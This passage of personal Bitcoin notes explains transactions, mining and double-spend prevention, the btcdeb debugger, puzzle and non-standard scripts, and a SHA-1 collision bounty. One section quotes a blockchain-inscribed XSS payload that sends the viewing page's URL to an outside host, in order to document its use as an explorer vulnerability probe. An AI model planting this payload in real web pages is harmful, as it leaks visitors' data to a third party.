But OK, nevermind that repo, it can be done easily with the [LevelDB](software.md#leveldb) API of any language: [https://bitcoin.stackexchange.com/questions/121888/what-is-the-data-format-layout-for-txindex-leveldb-values](https://bitcoin.stackexchange.com/questions/121888/what-is-the-data-format-layout-for-txindex-leveldb-values). Just the data seems wrong and we don't know why.

##### Get all Bitcoin transactions from and to a given address

↑ **Parent:** [Bitcoin HOWTO](#bitcoin-howto)

- [https://bitcoin.stackexchange.com/questions/77984/find-all-transactions-for-a-bitcoin-address](https://bitcoin.stackexchange.com/questions/77984/find-all-transactions-for-a-bitcoin-address) bad close
- [Blockchair](#blockchair)
  - [https://stackoverflow.com/questions/28205667/list-transactions-from-given-address-in-bitcoind/78009760#78009760](https://stackoverflow.com/questions/28205667/list-transactions-from-given-address-in-bitcoind/78009760#78009760)
    - [https://stackoverflow.com/questions/28205667/list-transactions-from-given-address-in-bitcoind/29244421#29244421](https://stackoverflow.com/questions/28205667/list-transactions-from-given-address-in-bitcoind/29244421#29244421) mentions --addrindex but that is dead now:
      - [https://github.com/btcsuite/btcd/pull/205](https://github.com/btcsuite/btcd/pull/205)
      - [https://github.com/btcsuite/btcd/issues/190](https://github.com/btcsuite/btcd/issues/190)
  - [https://bitcoin.stackexchange.com/questions/71019/filter-transactions-by-time-on-a-given-address/121720#121720](https://bitcoin.stackexchange.com/questions/71019/filter-transactions-by-time-on-a-given-address/121720#121720)
  - [https://bitcoin.stackexchange.com/questions/121718/fnd-the-most-valuable-transactions-made-to-a-given-address/121719#121719](https://bitcoin.stackexchange.com/questions/121718/fnd-the-most-valuable-transactions-made-to-a-given-address/121719#121719)

#### Bitcoin wallet

↑ **Parent:** [Bitcoin](#bitcoin)

##### Electrum

↑ **Parent:** [Bitcoin wallet](#bitcoin-wallet)  
🏷️ **Tags:** [Create Bitcoin wallet without a full node](#bitcoin-wallet-without-a-full-node)

[https://electrum.org/](https://electrum.org/)

[https://askubuntu.com/questions/281233/how-can-i-install-the-electrum-bitcoin-wallet/1384053#1384053](https://askubuntu.com/questions/281233/how-can-i-install-the-electrum-bitcoin-wallet/1384053#1384053)

For the love of God, on Ubuntu install from the official [AppImage](systems-programming.md#appimage) downloaded from [https://electrum.org/#download](https://electrum.org/#download), not this random outdated [Snap](systems-programming.md#snap-package-manager) [https://snapcraft.io/electrum](https://snapcraft.io/electrum):
- [https://askubuntu.com/questions/281233/how-can-i-install-the-electrum-bitcoin-wallet/1384053#1384053](https://askubuntu.com/questions/281233/how-can-i-install-the-electrum-bitcoin-wallet/1384053#1384053)
- [https://www.reddit.com/r/Electrum/comments/bf7iyl/electrum_synchronizing/](https://www.reddit.com/r/Electrum/comments/bf7iyl/electrum_synchronizing/)
- [https://www.reddit.com/r/CryptoCurrency/comments/peotkp/can_i_trust_the_electrum_snap_package/](https://www.reddit.com/r/CryptoCurrency/comments/peotkp/can_i_trust_the_electrum_snap_package/)

##### Bitcoin wallet without a full node

↑ **Parent:** [Bitcoin wallet](#bitcoin-wallet)

- [https://bitcoin.stackexchange.com/questions/52120/send-from-bitcoin-core-without-downloading-blockchain](https://bitcoin.stackexchange.com/questions/52120/send-from-bitcoin-core-without-downloading-blockchain)
- [https://www.reddit.com/r/Bitcoin/comments/5kmuya/is_it_possible_to_have_my_own_bitcoin_wallet/](https://www.reddit.com/r/Bitcoin/comments/5kmuya/is_it_possible_to_have_my_own_bitcoin_wallet/)

#### How Bitcoin works

↑ **Parent:** [Bitcoin](#bitcoin)

Here is a very direct description of the system:
- each transaction (transaction is often abbreviated "tx") has a list of inputs, and a list of outputs
- each input is the output of a previous transaction. You verify your identity as the indented receiver by producing a [digital signature](cryptography.md#digital-signature) for the [public key](cryptography.md#public-key-cryptography) specified on the output
- each output specifies the [public key](cryptography.md#public-key-cryptography) of the receiver and the value being sent
- the sum of output values cannot obvious exceed the sum of input values. If it is any less, the leftover is sent to the miner of the transaction as a transaction fee, which is an incentive for mining.
- once an output is used from an input, it becomes marked as spent, and cannot be reused again. Every input uses the selected output fully. Therefore, if you want to use an input of 1 [BTC](#bitcoin) to pay 0.1 [BTC](#bitcoin), what you do is to send 0.1 [BTC](#bitcoin) to the receiver, and 0.9 [BTC](#bitcoin) back to yourself as [change](#change-bitcoin). This is why the vast majority of transactions has two outputs: one "real", and the other [change](#change-bitcoin) back to self.
[Code 1. "Sample Bitcoin transaction graph"](#code-sample-bitcoin-transaction-graph) illustrates these concepts:
- `tx0`: magic transaction without any inputs, i.e. either [Genesis block](#genesis-block) or a coinbase [mining reward](#bitcoin-mining-reward). Since it is a magic transaction, it produces 3 Bitcoins from scratch: 1 in `out0` and 2 in `out1`. The initial value was actually 50 [BTC](#bitcoin) and reduced with time: [Section "Bitcoin halving"](#bitcoin-halving)
- `tx1`: regular transaction that takes:
  - a single input from `tx0 out0`, with value 1
  - produces two outputs:
    - `out0` for value 0.5
    - `out1` for value 0.3
  - this means that there was 0.2 left over from the input. This value will be given to the miner that mines this transaction.

  Since this is a regular transaction, no new coins are produced.
- `tx2`: regular transaction with a single input and a single output. It uses up the entire input, leading to 0 miner fees, so this greedy one might (will?) never get mined.
- `tx3`: regular transaction with two inputs and one output. The total input is 2.3, and the output is 1.8, so the miner fee will be 0.5

<a id="code-sample-bitcoin-transaction-graph"></a>
```
                   tx1                     tx3
  tx0            +---------------+       +---------------+
+----------+     | in0           |       | in0           |
| out0     |<------out: tx0 out0 |  +------out: tx1 out1 |
| value: 1 |     +---------------+  |    +---------------+
+----------+     | out0          |  |    | in1           |
| out1     |<-+  | value: 0.5    |  | +----out: tx2 out0 |
| value: 2 |  |  +---------------+  | |  +---------------+
+----------+  |  | out1          |<-+ |  | out1          |
              |  | value: 0.3    |    |  | value: 1.8    |
              |  +---------------+    |  +---------------+
              |                       |
              |                       |
              |                       |
              |    tx2                |
              |  +---------------+    |
              |  | in0           |    |
              +----out: tx0 out1 |    |
                 +---------------+    |
                 | out0          |<---+
                 | value: 2      |
                 +---------------+
```

Since every input must come from a previous output, there must be some magic way of generating new coins from scratch to bootstrap the system. This mechanism is that when the miner mines successfully, they get a mining fee, which is a magic transaction without any valid inputs and a pre-agreed value, and an incentive to use their power/compute resources to mine. This magic transaction is called a "[coinbase transaction](https://en.bitcoin.it/wiki/Coinbase)".

The key innovation of Bitcoin is how to prevent double spending, i.e. use a single output as the input of two different transactions, via mining.

For example, what prevents me from very quickly using a single output to pay two different people in quick succession?

The solution are the blocks. Blocks [discretize](calculus.md#discretization) transactions into chunks in a way that prevents double spending.

A block contains:
- a list of transactions that are valid amongst themselves. Notably, there can't be double spending within a block.

  People making transactions send them to the network, and miners select which ones they want to add to their block. Miners prefer to pick transactions that are:
  - small, as less bytes means less hashing costs. Small generally means "doesn't have a gazillion inputs/outputs".
  - have higher transaction fees, for obvious reasons
- the ID of its parent block. Blocks therefore form a linear linked list of blocks, except for temporary ties that are soon resolved. The longest known list block is considered to be the valid one.
- a nonce, which is an integer chosen "arbitrarily by the miner"

For a block to be valid, besides not containing easy to check stuff like double spending, the miner must also select a nonce such that the hash of the block starts with N zeroes.

For example, considering the transactions from [Code 1. "Sample Bitcoin transaction graph"](#code-sample-bitcoin-transaction-graph), the block structure shown at [Code 2. "Sample Bitcoin blockchain"](#code-sample-bitcoin-blockchain) would be valid. In it `block0` contains two transactions: `tx0` and `tx1`, and `block1` also contains two transactions: `tx2` and `tx3`.

<a id="code-sample-bitcoin-blockchain"></a>

```
 block0           block1             block2
+------------+   +--------------+   +--------------+
| prev:      |<----prev: block0 |<----prev: block1 |
+------------+   +--------------+   +--------------+
| txs:       |   | txs:         |   | txs:         |
| - tx0      |   | - tx2        |   | - tx4        |
| - tx1      |   | - tx3        |   | - tx5        |
+------------+   +--------------+   +--------------+
| nonce: 944 |   | nonce: 832   |   | nonce: 734   |
+------------+   +--------------+   +--------------+
```
The `nonce`s are on this example arbitrary chosen numbers that would lead to a desired hash for the block.

`block0` is the [Genesis block](#genesis-block), which is magic and does not have a previous block, because we have to start from somewhere. The network is hardcoded to accept that as a valid starting point.

Now suppose that the person who created `tx2` had tried to double spend and also created another transaction `tx2'` at the same time that looks like this:
```
  tx2'
+---------------+
| in0           |
| out: tx0 out1 |
+---------------+
| out0          |
| value: 2      |
+---------------+
```
Clearly, this transaction would try to spend `tx0 out1` one more time in addition to `tx2`, and should not be allowed! If this were attempted, only the following outcomes are possible:
- `block1` contains `tx2`. Then when `block2` gets made, it cannot contain `tx2'`, because `tx0 out1` was already spent by `tx2`
- `block1` contains `tx2'`. `tx2` cannot be spent anymore
Notably, it is not possible that `block1` contains both `tx2` and `tx2'`, as that would make the block invalid, and the network would not accept that block even if a miner found a `nonce`.

Since hashes are basically random, miners just have to try a bunch of nonces randomly until they find one that works.

The more zeroes, the harder it is to find the hash. For example, on the extreme case where N is all the bits of the hash output, we are trying to find a hash of exactly 0, which is statistically impossible. But if e.g. N=1, you will in average have to try only two nonces, N=2 four nonces, and so on.

The value N is updated every 2 weeks, and aims to make blocks to take 10 minutes to mine on average. N has to be increased with time, as more advanced hashing hardware has become available.

Once a miner finds a nonce that works, they send their block to the network. Other miners then verify the block, and once they do, they are highly incentivized to stop their hashing attempts, and make the new valid block be the new parent, and start over. This is because the length of the chain has already increased: they would need to mine two blocks instead of one if they didn't update to the newest block!

Therefore if you try to double spend, some random miner is going to select only one of your transactions and add it to the block.

They can't pick both, otherwise their block would be invalid, and other miners wouldn't accept is as the new longest one.

Then sooner or later, the transaction will be mined and added to the longest chain. At this point, the network will move to that newer header, and your second transaction will not be valid for any miner at all anymore, since it uses a spent output from the first one that went in. All miners will therefore drop that transaction, and it will never go in.

The goal of having this mandatory 10 minutes block interval is to make it very unlikely that two miners will mine at the exact same time, and therefore possibly each one mine one of the two double spending transactions. When ties to happen, miners randomly choose one of the valid blocks and work on top of it. The first one that does, now has a block of length L + 2 rather than L + 1, and therefore when that is propagated, everyone drops what they are doing and move to that new longest one.

Bibliography:
- [https://arstechnica.com/tech-policy/2020/12/how-bitcoin-works/](https://arstechnica.com/tech-policy/2020/12/how-bitcoin-works/)

##### Bitcoin script

↑ **Parent:** [How Bitcoin works](#how-bitcoin-works)

###### Bitcoin script debugger

↑ **Parent:** [Bitcoin script](#bitcoin-script)

###### btcdeb

↑ **Parent:** [Bitcoin script debugger](#bitcoin-script-debugger)

[https://github.com/bitcoin-core/btcdeb](https://github.com/bitcoin-core/btcdeb)

Tested on [Ubuntu 23.10](systems-programming.md#ubuntu-23-10):
```
sudo apt install libtool
git clone https://github.com/bitcoin-core/btcdeb
cd btcdeb
git checkout 4fd007e57b79cba9b5ffdf5ffe599778c0d63b88
./autogen.sh
./configure
make -j
```
Patch submited at: [https://github.com/bitcoin-core/btcdeb/pull/143](https://github.com/bitcoin-core/btcdeb/pull/143)

Then we use it;
```
./btcdeb '[OP_1 OP_2 OP_ADD]'
```
and inside the shell:
```
btcdeb 5.0.24 -- type `./btcdeb -h` for start up options
LOG: signing segwit taproot
notice: btcdeb has gotten quieter; use --verbose if necessary (this message is temporary)
3 op script loaded. type `help` for usage information
script  |  stack 
--------+--------
1       | 
2       | 
OP_ADD  | 
#0000 1
btcdeb> step
                <> PUSH stack 01
script  |  stack 
--------+--------
2       |      01
OP_ADD  | 
#0001 2
btcdeb> step
                <> PUSH stack 02
script  |  stack 
--------+--------
OP_ADD  |      02
        |      01
#0002 OP_ADD
btcdeb> step
                <> POP  stack
                <> POP  stack
                <> PUSH stack 03
script  |  stack 
--------+--------
        |      03
btcdeb> step
script  |  stack 
--------+--------
        |      03
btcdeb> step
at end of script
btcdeb>
```

###### Puzzle script

↑ **Parent:** [Bitcoin script](#bitcoin-script)

###### Bitcoin hash puzzle script

↑ **Parent:** [Puzzle script](#puzzle-script)

We've found three unspent puzzle scripts that require finding [SHA-256](computer-science.md#sha-256) hashes:
```
c4b46c5d88327d7af6254820562327c5f11b6ee5449da04b7cfd3710b48b6f55 0 OP_SHA256 None OP_EQUAL
702c36851ed202495c2bec1dd0cefb448b50fafd3a5cdd5058c18ca53fc2c3d1 0 OP_SHA256 None OP_EQUAL
fb01987b540ec286973aac248fab643de82813af452d958056fee8de9f4535ab 0 OP_SHA256 None OP_EQUAL
```

All three are also mentioned at: [https://bitcoincashresearch.org/t/p2sh32-a-long-term-solution-for-80-bit-p2sh-collision-attacks/750/23](https://bitcoincashresearch.org/t/p2sh32-a-long-term-solution-for-80-bit-p2sh-collision-attacks/750/23) in addition to some `OP_HASH256` ones. The thread manages to identify one of the `OP_HASH256` ones as a fake [Genesis block](#genesis-block) hash.

They can be viewed disassembled at:
- [https://mempool.space/tx/c4b46c5d88327d7af6254820562327c5f11b6ee5449da04b7cfd3710b48b6f55](https://mempool.space/tx/c4b46c5d88327d7af6254820562327c5f11b6ee5449da04b7cfd3710b48b6f55) hash required: 5efe500c58a4847dab87162f88a79f08249b988265d5061696b5d0c94fd8080d. Mentions:
  - [https://github.com/manly/BlockChainParser/blob/0c65312abfaa659d38bfa465c1413d72284cf30d/Documentation/patterns.txt#L99](https://github.com/manly/BlockChainParser/blob/0c65312abfaa659d38bfa465c1413d72284cf30d/Documentation/patterns.txt#L99)
- [https://mempool.space/tx/702c36851ed202495c2bec1dd0cefb448b50fafd3a5cdd5058c18ca53fc2c3d1](https://mempool.space/tx/702c36851ed202495c2bec1dd0cefb448b50fafd3a5cdd5058c18ca53fc2c3d1) hash required: 3f6d4081222a35483cdf4cefd128167f133c33e1e0f0b1d638be131a14dc2c5e
- [https://mempool.space/tx/fb01987b540ec286973aac248fab643de82813af452d958056fee8de9f4535ab](https://mempool.space/tx/fb01987b540ec286973aac248fab643de82813af452d958056fee8de9f4535ab) hash required: 6380315536fa75ccf0d8180755c9f8106466ee3561405081cab736f49e25baab Mentions:
  - [https://github.com/RKlompUU/SCRIPTAnalyser/blob/398410419e199a3ecb219ebe5fed570a2aabd7bb/scripts/ns10#L1](https://github.com/RKlompUU/SCRIPTAnalyser/blob/398410419e199a3ecb219ebe5fed570a2aabd7bb/scripts/ns10#L1)

They were mined on 01 Apr 2014, 02 Apr 2014 and 03 Apr 2014, suggesting a possible April fool's reference?

Each is worth 0.0002 BTC, which is only 20$ as of 2024, so it's not worth much effort beyond the fun aspect of it. But it is fun!

###### Finding unspent puzzle scripts

↑ **Parent:** [Puzzle script](#puzzle-script)

[https://github.com/cirosantilli/bitcoin-inscription-indexer?tab=readme-ov-file#utxo_nonstandard](https://github.com/cirosantilli/bitcoin-inscription-indexer?tab=readme-ov-file#utxo_nonstandard)

###### BSHUNTER: Detecting and Tracing Defects of Bitcoin Scripts

↑ **Parent:** [Finding unspent puzzle scripts](#finding-unspent-puzzle-scripts)

[https://dl.acm.org/doi/abs/10.1109/ICSE48619.2023.00037](https://dl.acm.org/doi/abs/10.1109/ICSE48619.2023.00037)

Authors: Peilin Zheng, Xiapu Luo, Zibin Zheng

Epic title.

###### Bitcoin script type

↑ **Parent:** [Bitcoin script](#bitcoin-script)

###### Multisig

↑ **Parent:** [Bitcoin script type](#bitcoin-script-type)

[https://en.bitcoin.it/wiki/Multi-signature](https://en.bitcoin.it/wiki/Multi-signature)

###### P2PKH

↑ **Parent:** [Bitcoin script type](#bitcoin-script-type)

###### P2SH

↑ **Parent:** [Bitcoin script type](#bitcoin-script-type)

###### Bitcoin non-standard transaction

↑ **Parent:** [Bitcoin script type](#bitcoin-script-type)

Full list at: [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/utxo_nonstandard](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/utxo_nonstandard)

Bibliography:
- [https://bitcoin.stackexchange.com/questions/5883/is-there-a-listing-of-strange-or-unusual-scripts-found-in-transactions/105392#105392](https://bitcoin.stackexchange.com/questions/5883/is-there-a-listing-of-strange-or-unusual-scripts-found-in-transactions/105392#105392)
- [https://bitcoin.stackexchange.com/questions/547/useful-alternative-bitcoin-transaction-scripts](https://bitcoin.stackexchange.com/questions/547/useful-alternative-bitcoin-transaction-scripts)
- [https://bitcoin.stackexchange.com/questions/35956/non-standard-tx-with-obscure-op-codes-examples/36037#36037](https://bitcoin.stackexchange.com/questions/35956/non-standard-tx-with-obscure-op-codes-examples/36037#36037) notably provides the amazing [https://www.quantabytes.com/articles/a-survey-of-bitcoin-transaction-types](https://www.quantabytes.com/articles/a-survey-of-bitcoin-transaction-types)
Monday, January 29, 2024

###### An overview of recent non-standard Bitcoin transactions by 0xB10C

↑ **Parent:** [Bitcoin non-standard transaction](#bitcoin-non-standard-transaction)

[https://b10c.me/observations/09-non-standard-transactions/](https://b10c.me/observations/09-non-standard-transactions/)

###### Invalid Bitcoin transaction script

↑ **Parent:** [Bitcoin non-standard transaction](#bitcoin-non-standard-transaction)

<h6 id="op-invalidopcode">OP_INVALIDOPCODE</h6>

↑ **Parent:** [Invalid Bitcoin transaction script](#invalid-bitcoin-transaction-script)

###### 77822fd6663c665104119cb7635352756dfc50da76a92d417ec1a12c518fad69

↑ **Parent:** [OP\_INVALIDOPCODE](#op-invalidopcode)

Ouptut 0 disassembles as:
```
OP_IF OP_INVALIDOPCODE 4effffffff <large constant> OP_ENDIF
```
The large constant contains an ASCII [Bitcoin Core](#bitcoin-core) patch entitled `Remove (SINGLE|DOUBLE)BYTE` so presumably this is a proof of concept:
```
From a3a61fef43309b9fb23225df7910b03afc5465b9 Mon Sep 17 00:00:00 2001
From: Satoshi Nakamoto <satoshin@gmx.com>
Date: Mon, 12 Aug 2013 02:28:02 -0200
Subject: [PATCH] Remove (SINGLE|DOUBLE)BYTE

I removed this from Bitcoin in f1e1fb4bdef878c8fc1564fa418d44e7541a7e83
in Sept 7 2010, almost three years ago. Be warned that I have not
actually tested this patch.
---
 backends/bitcoind/deserialize.py |    8 +-------
 1 file changed, 1 insertion(+), 7 deletions(-)

diff --git a/backends/bitcoind/deserialize.py b/backends/bitcoind/deserialize.py
index 6620583..89b9b1b 100644
--- a/backends/bitcoind/deserialize.py
+++ b/backends/bitcoind/deserialize.py
@@ -280,10 +280,8 @@ opcodes = Enumeration("Opcodes", [
     "OP_WITHIN", "OP_RIPEMD160", "OP_SHA1", "OP_SHA256", "OP_HASH160",
     "OP_HASH256", "OP_CODESEPARATOR", "OP_CHECKSIG", "OP_CHECKSIGVERIFY", "OP_CHECKMULTISIG",
     "OP_CHECKMULTISIGVERIFY",
-    ("OP_SINGLEBYTE_END", 0xF0),
-    ("OP_DOUBLEBYTE_BEGIN", 0xF000),
     "OP_PUBKEY", "OP_PUBKEYHASH",
-    ("OP_INVALIDOPCODE", 0xFFFF),
+    ("OP_INVALIDOPCODE", 0xFF),
 ])
 
 
@@ -293,10 +291,6 @@ def script_GetOp(bytes):
         vch = None
         opcode = ord(bytes[i])
         i += 1
-        if opcode >= opcodes.OP_SINGLEBYTE_END and i < len(bytes):
-            opcode <<= 8
-            opcode |= ord(bytes[i])
-            i += 1
 
         if opcode <= opcodes.OP_PUSHDATA4:
             nSize = opcode
-- 
1.7.9.4
```

[https://bitcointalk.org/index.php?topic=5231222.0](https://bitcointalk.org/index.php?topic=5231222.0) discusses what happens if there is an invalid opcode in a branch that is not taken.

Discussed at: [https://bitcoin.stackexchange.com/questions/35956/non-standard-tx-with-obscure-op-codes-examples](https://bitcoin.stackexchange.com/questions/35956/non-standard-tx-with-obscure-op-codes-examples)

<h6 id="peter-todd-s-hash-collision-puzzles">Peter Todd's hash collision puzzles</h6>

↑ **Parent:** [Bitcoin non-standard transaction](#bitcoin-non-standard-transaction)  
🏷️ **Tags:** [Puzzle script](#puzzle-script)

- [https://bitcointalk.org/index.php?topic=293382.0](https://bitcointalk.org/index.php?topic=293382.0)
- [https://xiaohuiliu.medium.com/bitcoin-zk-bounty-series-part-2-finding-hash-collisions-5e3aa3eb3925](https://xiaohuiliu.medium.com/bitcoin-zk-bounty-series-part-2-finding-hash-collisions-5e3aa3eb3925)
- [https://bitcoinjs-guide.bitcoin-studio.com/bitcoinjs-guide/v5/part-three-pay-to-script-hash/puzzles/computational_puzzle_sha1_collision_p2sh](https://bitcoinjs-guide.bitcoin-studio.com/bitcoinjs-guide/v5/part-three-pay-to-script-hash/puzzles/computational_puzzle_sha1_collision_p2sh)

As mentioned at the prize was claimed at [8d31992805518fd62daa3bdd2a5c4fd2cd3054c9b3dca1d78055e9528cff6adc](https://www.blockchain.com/explorer/transactions/btc/8d31992805518fd62daa3bdd2a5c4fd2cd3054c9b3dca1d78055e9528cff6adc) (2017-02-23) which spends several inputs with the same unlock script that presents two different constantants that have the same [SHA-1](computer-science.md#sha-1):
```
printf 255044462d312e330a25e2e3cfd30a0a0a312030206f626a0a3c3c2f57696474682032203020522f4865696768742033203020522f547970652034203020522f537562747970652035203020522f46696c7465722036203020522f436f6c6f7253706163652037203020522f4c656e6774682038203020522f42697473506572436f6d706f6e656e7420383e3e0a73747265616d0affd8fffe00245348412d3120697320646561642121212121852fec092339759c39b1a1c63c4c97e1fffe017f46dc93a6b67e013b029aaa1db2560b45ca67d688c7f84b8c4c791fe02b3df614f86db1690901c56b45c1530afedfb76038e972722fe7ad728f0e4904e046c230570fe9d41398abe12ef5bc942be33542a4802d98b5d70f2a332ec37fac3514e74ddc0f2cc1a874cd0c78305a21566461309789606bd0bf3f98cda8044629a1 | xxd -r -p | sha1sum
printf 255044462d312e330a25e2e3cfd30a0a0a312030206f626a0a3c3c2f57696474682032203020522f4865696768742033203020522f547970652034203020522f537562747970652035203020522f46696c7465722036203020522f436f6c6f7253706163652037203020522f4c656e6774682038203020522f42697473506572436f6d706f6e656e7420383e3e0a73747265616d0affd8fffe00245348412d3120697320646561642121212121852fec092339759c39b1a1c63c4c97e1fffe017346dc9166b67e118f029ab621b2560ff9ca67cca8c7f85ba84c79030c2b3de218f86db3a90901d5df45c14f26fedfb3dc38e96ac22fe7bd728f0e45bce046d23c570feb141398bb552ef5a0a82be331fea48037b8b5d71f0e332edf93ac3500eb4ddc0decc1a864790c782c76215660dd309791d06bd0af3f98cda4bc4629b1 | xxd -r -p | sha1sum
```
both giving
```
f92d74e3874587aaf443d1db961d4e26dde13e9c
```
It was claimed on the same day that [Google](google.md) disclosed the collision: [https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html](https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html)

Both of these are [PDF](computer.md#pdf) prefixes, so they start with the PDF [file signature](computer-hardware.md#file-signature), but are not fully viewable PDFs on their own. 

###### Peter Todd

↑ **Parent:** [Peter Todd's hash collision puzzles](#peter-todd-s-hash-collision-puzzles)

- [https://bitcointalk.org/index.php?action=profile;u=2546](https://bitcointalk.org/index.php?action=profile;u=2546)
- [https://twitter.com/peterktodd](https://twitter.com/peterktodd)
- [https://github.com/petertodd](https://github.com/petertodd)
- [https://petertodd.org/](https://petertodd.org/)
- [https://www.reddit.com/user/petertodd/](https://www.reddit.com/user/petertodd/)

###### Bitcoin script that terminates with multiple values on the stack

↑ **Parent:** [Bitcoin non-standard transaction](#bitcoin-non-standard-transaction)

- [https://www.reddit.com/r/Bitcoin/comments/67l7ox/does_the_stack_have_to_only_contain_true/](https://www.reddit.com/r/Bitcoin/comments/67l7ox/does_the_stack_have_to_only_contain_true/)
- [https://github.com/bitcoin/bitcoin/commit/39f0d9686095bce469dbfa52333331a5d15c6545](https://github.com/bitcoin/bitcoin/commit/39f0d9686095bce469dbfa52333331a5d15c6545)

###### 3ad6677303fb6f700a4f2f977fe86e5324e0ddb0d3b33a649e513d7e88904e85

↑ **Parent:** [Bitcoin script that terminates with multiple values on the stack](#bitcoin-script-that-terminates-with-multiple-values-on-the-stack)

This contains various outputs that seem trivially spendable in a made up of two non-zero constants, e.g.:
```
    {
      "value": 0.00002000,
      "n": 9,
      "scriptPubKey": {
        "asm": "1 8fe61f026c7545a99c6e0f37a5a7eceee5fdf6723c1994ccbfb740556632e9fe",
        "desc": "rawtr(8fe61f026c7545a99c6e0f37a5a7eceee5fdf6723c1994ccbfb740556632e9fe)#lxgt8lak",
        "hex": "51208fe61f026c7545a99c6e0f37a5a7eceee5fdf6723c1994ccbfb740556632e9fe",
        "address": "bc1p3lnp7qnvw4z6n8rwpum6tflvamjlmanj8svefn9lkaq92e3ja8lqcc8mcx",
        "type": "witness_v1_taproot"
      }
    },
```
Or are we missing something? The values are quite small and wouldn't be worth it the miner fees most likely. But is there a fundamental reason why this couldn't be spent by a non-standard miner?

###### Provably unspendable Bitcoin output script

↑ **Parent:** [Bitcoin non-standard transaction](#bitcoin-non-standard-transaction)

###### 4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af

↑ **Parent:** [Provably unspendable Bitcoin output script](#provably-unspendable-bitcoin-output-script)

Output 0 does:
```
OP_ADD OP_ADD 13 OP_EQUAL OP_NOTIF OP_RETURN OP_ENDIF OP_FROMALTSTACK <large xss constant> OP_DROP
```
where the large constant is an interesting [inscription](social-technology.md#inscription-blockchain) to test for the presence of [XSS](software.md#cross-site-scripting) attacks on [blockchain explorers](#blockchain-explorer):
```
<script type='text/javascript'>document.write('<img src='http://www.trollbot.org/xss-blockchain-detector.php?href=' + location.href + ''>');</script>`
```
This is almost spendable with:
```
1 OP_TOALTSTACK 10 1 2
```
but that fails because the altstack is cleared between the input and the output script, so this output is provably unspendable.

Bibliography:
- [https://www.reddit.com/r/Bitcoin/comments/2c5tdz/found_this_while_crawling_the_metadata/](https://www.reddit.com/r/Bitcoin/comments/2c5tdz/found_this_while_crawling_the_metadata/)
- [https://bitcointalk.org/index.php?topic=701556.0](https://bitcointalk.org/index.php?topic=701556.0)

###### a165c82cf21a6bae54dde98b7e00ab43b695debb59dfe7d279ac0c59d6043e24

↑ **Parent:** [4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af](#4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af)

Sister transaction of [4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af](#4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af) with another variant of the [XSS](software.md#cross-site-scripting) but without IF and `OP_FROMALTSTACK`, thus making it spendable:
```
OP_ADD OP_ADD 13 OP_EQUAL <large xss constant> OP_DROP
```

###### 5660d06bd69326c18ec63127b37fb3b32ea763c3846b3334c51beb6a800c57d3

↑ **Parent:** [Provably unspendable Bitcoin output script](#provably-unspendable-bitcoin-output-script)  
🏷️ **Tags:** [Coinbase transaction](#coinbase-transaction)

In this malformed [Coinbase](#coinbase) transaction, the mining pool "nicehash" produced a [provably unspendable Bitcoin output script](#provably-unspendable-bitcoin-output-script) due to a bug, and therefore lost most of the entire [block reward](#block-reward) of 6.25 [BTC](#bitcoin) then worth about $ 123,000.

The output is unspendable because it ends in a constant 0, the disassembly of the first and main output is this series of constants:
```
0 017fed86bba5f31f955f8b316c7fb9bd45cb6cbc 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
```
and for the second smaller one:
```
aa21a9ed62ec16bf1a388c7884e9778ddb0e26c0bf982dada47aaa5952347c0993da 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
```
the third one being an [OP\_RETURN](#op-return) message.

This event received some coverage:
- [https://twitter.com/hashrateindex/status/1583146537538170880](https://twitter.com/hashrateindex/status/1583146537538170880)
- [https://www.linkedin.com/posts/david-westrop_block-759475-was-mined-without-a-payout-activity-6989026297020628992-qtx4/?originalSubdomain=lk](https://www.linkedin.com/posts/david-westrop_block-759475-was-mined-without-a-payout-activity-6989026297020628992-qtx4/?originalSubdomain=lk)

[https://www.blockchain.com/explorer/transactions/btc/5660d06bd69326c18ec63127b37fb3b32ea763c3846b3334c51beb6a800c57d3](https://www.blockchain.com/explorer/transactions/btc/5660d06bd69326c18ec63127b37fb3b32ea763c3846b3334c51beb6a800c57d3)

###### Invalid Bitcoin script

↑ **Parent:** [Bitcoin script type](#bitcoin-script-type)

They appear to be included, with rationale that you can already include syntactically valid crap in an unprovable way: [https://github.com/bitcoin/bitcoin/issues/320](https://github.com/bitcoin/bitcoin/issues/320) Better then have syntactically invalid crap that is provable.

The outputs of this transaction seem to be the first syntactically incorrect scripts of the blockchain: [https://blockchain.info/tx/ebc9fa1196a59e192352d76c0f6e73167046b9d37b8302b6bb6968dfd279b767?format=json](https://blockchain.info/tx/ebc9fa1196a59e192352d76c0f6e73167046b9d37b8302b6bb6968dfd279b767?format=json), found by parsing everything locally. The transaction was made in 2013 for 0.1 [BTC](#bitcoin), which then became unspendable.

The first invalid script is just e.g. "script":"01", which says will push one byte into the stack, but then ends prematurely.

###### Bitcoin script operator

↑ **Parent:** [Bitcoin script](#bitcoin-script)

<h6 id="op-return">OP_RETURN</h6>

↑ **Parent:** [Bitcoin script operator](#bitcoin-script-operator)  
🏷️ **Tags:** [Bitcoin inscription method](#bitcoin-inscription-method)

`OP_RETURN` HOWTO:
- [https://bitcoin.stackexchange.com/questions/25224/what-is-a-step-by-step-way-to-insert-data-in-op-return](https://bitcoin.stackexchange.com/questions/25224/what-is-a-step-by-step-way-to-insert-data-in-op-return)

###### Bitcoin input script

↑ **Parent:** [Bitcoin script](#bitcoin-script)

###### Bitcoin output script

↑ **Parent:** [Bitcoin script](#bitcoin-script)

##### Change (Bitcoin)

↑ **Parent:** [How Bitcoin works](#how-bitcoin-works)

##### Bitcoin mining reward

↑ **Parent:** [How Bitcoin works](#how-bitcoin-works)  
🏷️ **Tags:** [Block reward](#block-reward), [Mining reward](#mining-reward)

###### Bitcoin halving

↑ **Parent:** [Bitcoin mining reward](#bitcoin-mining-reward)

